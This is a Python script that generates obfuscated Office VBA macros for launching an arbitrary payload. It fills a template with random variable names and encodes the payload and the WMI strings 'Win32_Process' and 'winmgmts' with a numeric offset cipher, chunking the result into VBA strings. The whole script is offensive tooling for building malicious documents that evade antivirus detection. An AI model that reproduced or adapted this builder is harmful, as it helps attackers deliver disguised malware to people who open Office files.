import sys
import re
import random
import string

output_name = sys.argv[1]
offset = int(sys.argv[2])
payload = sys.argv[3]

# 1
def cript(offset, payload):
    result = ''.join(f"{ord(c) + offset:03d}" for c in payload)
    return result


with open('payload.txt', 'r') as file:
    template=file.read()


with open(output_name, 'w') as file:
    file.write(template)

variable_names = ['<variable0>', '<variable2>', '<variable3>', '<variable4>', '<variable5>', '<variable6>', '<variable7>', '<variable8>', '<variable9>', '<variable10>', '<variable11>', '<variable12>', '<variable13>', '<variable14>', '<variable15>']

for variable_name in variable_names:

    with open(output_name, 'r') as file:
        variable=file.read()

    length = random.randint(25, 54)

    string_generate = ''.join(random.choices(string.ascii_letters, k=length))

    pattern = variable_name
    replacement = string_generate
    variable = re.sub(pattern, replacement, variable)
    

    with open(output_name, 'w') as file:
        file.write(variable)
print(f'Generate Macros Name: {output_name}')

# <Win32_Process> 

with open(output_name, 'r') as file:
    results=file.read()

pattern = f'<Win32_Process>'
paylaod_variable = f'Win32_Process'
replacement = cript(offset, paylaod_variable)
variable = re.sub(pattern, replacement, results)

with open(output_name, 'w') as file:
    file.write(variable)

# <winmgmts>

with open(output_name, 'r') as file:
    results=file.read()

pattern = r'<winmgmts>'
payload_variable = r'winmgmts:\\.\root\cimv2'
replacement = cript(offset, payload_variable)
variable = re.sub(pattern, replacement, results)

with open(output_name, 'w') as file:
    file.write(variable)


# Offset

with open(output_name, 'r') as file:
    name_variable = file.read()

pattern = r'<offset>'
replacement =  str(offset)
variable = re.sub(pattern, replacement, name_variable)

with open(output_name, 'w') as file:
    file.write(variable)

# Name variable <hello.doc>

with open(output_name, 'r') as file:
    name_variable = file.read()

pattern = "<hello.doc>"
replacement = cript(offset, output_name)
variable = re.sub(pattern, replacement, name_variable)

with open(output_name, 'w') as file:
    file.write(variable)



# PAYLOAD

def split_to_vba_string(text, chunk_size=50):
    if len(text) <= chunk_size:
        return f'"{text}"'
    
    chunks = [text[i:i+chunk_size] for i in range(0, len(text), chunk_size)]
    
    vba_lines = []
    for i, chunk in enumerate(chunks):
        if i == 0:
            vba_lines.append(f'"{chunk}"')
        else:
            vba_lines.append(f'    "{chunk}"')
    
    return " & _\n".join(vba_lines)

# PAYLOAD

with open(output_name, 'r') as file:
    name_variable = file.read()

pattern = r'<PAYLOAD>'
replacement = cript(offset, payload)

if len(replacement) > 20:
    vba_formatted = split_to_vba_string(replacement)
    variable = re.sub(pattern, vba_formatted, name_variable)
else:
    variable = replacement

with open(output_name, 'w') as file:
    file.write(variable)
